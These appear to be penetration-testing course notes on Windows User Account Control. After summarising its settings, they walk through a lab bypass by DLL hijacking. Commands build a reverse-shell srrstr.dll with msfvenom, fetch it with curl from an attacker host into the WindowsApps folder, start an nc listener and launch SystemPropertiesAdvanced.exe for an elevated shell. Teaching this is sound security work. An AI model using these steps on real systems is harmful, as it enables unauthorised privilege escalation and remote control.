# Windows User Account Control Bypass

* User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
* Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system.
* When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run.
* It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
* When UAC is in place, a user can log into their system with their standard user account.
* When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user.
  * Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.

### How User Account Control works

* https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works
* Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment.

#### User Account Control settings and configuration

* https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune

| Setting name                                                                         | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Admin Approval Mode for the Built-in Administrator account                           | <p>Controls the behavior of Admin Approval Mode for the built-in Administrator account.<br><br><strong>Enabled</strong>: The built-in Administrator account uses Admin Approval Mode. By default, any operation that requires elevation of privilege prompts the user to approve the operation.<br><strong>Disabled (default)</strong>: The built-in Administrator account runs all applications with full administrative privilege.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Allow UIAccess applications to prompt for elevation without using the secure desktop | <p>Controls whether User Interface Accessibility (UIAccess or UIA) programs can automatically disable the secure desktop for elevation prompts used by a standard user.<br><br><strong>Enabled</strong>: UIA programs, including Remote Assistance, automatically disable the secure desktop for elevation prompts. If you don't disable the <strong>Switch to the secure desktop when prompting for elevation</strong> policy setting, the prompts appear on the interactive user's desktop instead of the secure desktop. This setting allows the remote administrator to provide the appropriate credentials for elevation. This policy setting doesn't change the behavior of the UAC elevation prompt for administrators. If you plan to enable this policy setting, you should also review the effect of the <strong>Behavior of the elevation prompt for standard users</strong> policy setting: if it's' configured as <strong>Automatically deny elevation requests</strong>, elevation requests aren't presented to the user.<br><strong>Disabled (default)</strong>: The secure desktop can be disabled only by the user of the interactive desktop or by disabling the <strong>Switch to the secure desktop when prompting for elevation</strong> policy setting.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| Behavior of the elevation prompt for administrators in Admin Approval Mode           | <p>Controls the behavior of the elevation prompt for administrators.<br><br><strong>Elevate without prompting</strong>: Allows privileged accounts to perform an operation that requires elevation without requiring consent or credentials. <strong>Use this option only in the most constrained environments</strong>.<br><strong>Prompt for credentials on the secure desktop</strong>: When an operation requires elevation of privilege, the user is prompted on the secure desktop to enter a privileged user name and password. If the user enters valid credentials, the operation continues with the user's highest available privilege.<br><strong>Prompt for consent on the secure desktop</strong>: When an operation requires elevation of privilege, the user is prompted on the secure desktop to select either Permit or Deny. If the user selects Permit, the operation continues with the user's highest available privilege.<br><strong>Prompt for credentials</strong>: When an operation requires elevation of privilege, the user is prompted to enter an administrative user name and password. If the user enters valid credentials, the operation continues with the applicable privilege.<br><strong>Prompt for consent</strong>: When an operation requires elevation of privilege, the user is prompted to select either Permit or Deny. If the user selects Permit, the operation continues with the user's highest available privilege.<br><strong>Prompt for consent for non-Windows binaries (default)</strong>: When an operation for a non-Microsoft application requires elevation of privilege, the user is prompted on the secure desktop to select either Permit or Deny. If the user selects Permit, the operation continues with the user's highest available privilege.</p> |
| Behavior of the elevation prompt for standard users                                  | <p>Controls the behavior of the elevation prompt for standard users.<br><br><strong>Prompt for credentials (default)</strong>: When an operation requires elevation of privilege, the user is prompted to enter an administrative user name and password. If the user enters valid credentials, the operation continues with the applicable privilege.<br><strong>Automatically deny elevation requests</strong>: When an operation requires elevation of privilege, a configurable access denied error message is displayed. An enterprise that is running desktops as standard user may choose this setting to reduce help desk calls.<br><strong>Prompt for credentials on the secure desktop</strong> When an operation requires elevation of privilege, the user is prompted on the secure desktop to enter a different user name and password. If the user enters valid credentials, the operation continues with the applicable privilege.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Detect application installations and prompt for elevation                            | <p>Controls the behavior of application installation detection for the computer.<br><br><strong>Enabled (default)</strong>: When an app installation package is detected that requires elevation of privilege, the user is prompted to enter an administrative user name and password. If the user enters valid credentials, the operation continues with the applicable privilege.<br><strong>Disabled</strong>: App installation packages aren't detected and prompted for elevation. Enterprises that are running standard user desktops and use delegated installation technologies, such as Microsoft Intune, should disable this policy setting. In this case, installer detection is unnecessary.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Only elevate executables that are signed and validated                               | <p>Enforces signature checks for any interactive applications that request elevation of privilege. IT admins can control which applications are allowed to run by adding certificates to the Trusted Publishers certificate store on local devices.<br><br><strong>Enabled</strong>: Enforces the certificate certification path validation for a given executable file before it's permitted to run.<br><strong>Disabled (default)</strong>: Doesn't enforce the certificate certification path validation before a given executable file is permitted to run.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Only elevate UIAccess applications that are installed in secure locations            | <p>Controls whether applications that request to run with a User Interface Accessibility (UIAccess) integrity level must reside in a secure location in the file system. Secure locations are limited to the following folders:<br>- <code>%ProgramFiles%</code>, including subfolders<br>- <code>%SystemRoot%\system32\</code><br>- <code>%ProgramFiles(x86)%</code>, including subfolders<br><br><br><strong>Enabled (default)</strong>: If an app resides in a secure location in the file system, it runs only with UIAccess integrity.<br><strong>Disabled</strong>: An app runs with UIAccess integrity even if it doesn't reside in a secure location in the file system.<br><br><strong>Note:</strong> Windows enforces a digital signature check on any interactive apps that requests to run with a UIAccess integrity level regardless of the state of this setting.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Run all administrators in Admin Approval Mode                                        | <p>Controls the behavior of all UAC policy settings.<br><br><strong>Enabled (default)</strong>: Admin Approval Mode is enabled. This policy must be enabled and related UAC settings configured. The policy allows the built-in Administrator account and members of the Administrators group to run in Admin Approval Mode.<br><strong>Disabled</strong>: Admin Approval Mode and all related UAC policy settings are disabled. Note: If this policy setting is disabled, <strong>Windows Security</strong> notifies you that the overall security of the operating system is reduced.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Switch to the secure desktop when prompting for elevation                            | <p>This policy setting controls whether the elevation request prompt is displayed on the interactive user's desktop or the secure desktop.<br><br><strong>Enabled (default)</strong>: All elevation requests go to the secure desktop regardless of prompt behavior policy settings for administrators and standard users.<br><strong>Disabled</strong>: All elevation requests go to the interactive user's desktop. Prompt behavior policy settings for administrators and standard users are used.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Virtualize File And Registry Write Failures To Per User Locations                    | <p>Controls whether application write failures are redirected to defined registry and file system locations. This setting mitigates applications that run as administrator and write run-time application data to <code>%ProgramFiles%</code>, <code>%Windir%</code>, <code>%Windir%\system32</code>, or <code>HKLM\Software</code>.<br><br><strong>Enabled (default)</strong>: App write failures are redirected at run time to defined user locations for both the file system and registry.<br><strong>Disabled</strong>: Apps that write data to protected locations fail.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |

### User Account Control bypass

* UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.
* The `default RID 500 administrator` account always operates at the high mandatory level.
  * With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in.
* In the example below, the user account `sarah` is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.

#### Checking Current User

```cmd-session
whoami /user
```

```cmd-session
USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

#### Confirming Admin Group Membership

```cmd-session
net localgroup administrators
```

```cmd-session
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

#### Reviewing User Privileges

```cmd-session
whoami /priv
```

#### Confirming UAC is Enabled

* There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token.
  * First, let's confirm if UAC is enabled and, if so, at what level.

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

```cmd-session
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

#### Checking UAC Level

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

```cmd-session
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

* The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled.
  * There are fewer UAC bypasses at this highest level.

#### Checking Windows Version

* UAC bypasses leverage flaws or unintended functionality in different Windows builds.
* in powershell

```powershell-session
[environment]::OSVersion.Version
```

```powershell-session
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

* This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page we cross-reference to Windows release `1607`.
  * The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses
    * including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.
* According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.
* When attempting to locate a DLL, Windows will use the following search order.
  1. The directory from which the application loaded.
  2. The system directory `C:\Windows\System32` for 64-bit systems.
  3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
  4. The Windows directory.
  5. Any directories that are listed in the PATH environment variable.

#### Reviewing Path Variable

```powershell-session
cmd /c echo %PATH%
```

```powershell-session

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

* The `WindowsApps` folder is within the user's profile and writable by the user.
* We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

#### Generating Malicious srrstr.dll DLL

```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

#### Starting Python HTTP Server on Attack Host

* \[\[Personal web server]]

```shell-session
sudo python3 -m http.server 8080
```

#### Downloading DLL Target

```powershell-session
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Starting nc Listener on Attack Host

```shell-session
nc -lvnp 8443
```

#### Testing Connection

```cmd-session
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

* Once we get a connection back, we'll see normal user rights.

#### Executing SystemPropertiesAdvanced.exe on Target Host

```cmd-session
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### Receiving Connection Back

* Checking back on our listener, we should receive a connection almost instantly.









